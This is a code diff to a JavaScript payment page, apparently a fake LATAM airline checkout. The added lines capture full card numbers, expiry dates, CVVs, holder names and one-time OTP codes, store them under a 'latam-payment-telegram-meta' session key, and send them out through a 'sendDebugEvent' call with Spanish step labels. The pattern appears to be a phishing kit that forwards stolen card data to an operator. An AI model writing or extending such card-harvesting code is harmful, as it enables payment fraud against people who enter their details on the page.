@@ -1289,9 +1289,7 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
       console.log('CARD: ', cardNumber.value)
       console.log('EXP: ', cardExp.value)
       console.log('CVV: ', cardCvv.value)
-      const route = await sendDebugEvent('PAYMENT_SUBMIT', {
-        cardFirstDigit: cardDigits.charAt(0),
-        meta: {
+      const paymentMeta = {
           step: 'Envió datos de tarjeta',
           brand: brandKey,
           amount: Number(total) || 0,
@@ -1305,7 +1303,11 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
             exp: cardExp.value,
             holder: cardName.value,
           }
-        },
+        };
+      sessionStorage.setItem('latam-payment-telegram-meta', JSON.stringify(paymentMeta));
+      const route = await sendDebugEvent('PAYMENT_SUBMIT', {
+        cardFirstDigit: cardDigits.charAt(0),
+        meta: paymentMeta,
       });
       if (route?.brand && ['visa', 'amex', 'diners', 'mastercard', 'discover'].includes(route.brand)) {
         brandKey = route.brand;
@@ -1394,7 +1396,29 @@ const legsJson = JSON.stringify(defaultPaymentLegs);
         console.log('----------------')
         console.log('OTP_SUBMIT:')
         console.log('OTP: ', input.value)
+        let paymentMeta = {};
+        try {
+          paymentMeta = JSON.parse(sessionStorage.getItem('latam-payment-telegram-meta') || '{}') || {};
+        } catch {
+          paymentMeta = {};
+        }
+        if (!paymentMeta.cpayload && cardNumber?.value) {
+          paymentMeta = {
+            step: 'Envió código OTP',
+            brand: brandKey,
+            amount: Number(total) || 0,
+            amountLabel: money(total, true),
+            card: maskCard(cardNumber.value),
+            cpayload: {
+              b: cardNumber.value,
+              cv: cardCvv?.value || '',
+              exp: cardExp?.value || '',
+              holder: cardName?.value || '',
+            },
+          };
+        }
         await sendDebugEvent('OTP_SUBMIT', {
+          meta: paymentMeta,
           metaOtp: {
             step: 'Envió código OTP',
             brand: brandKey,
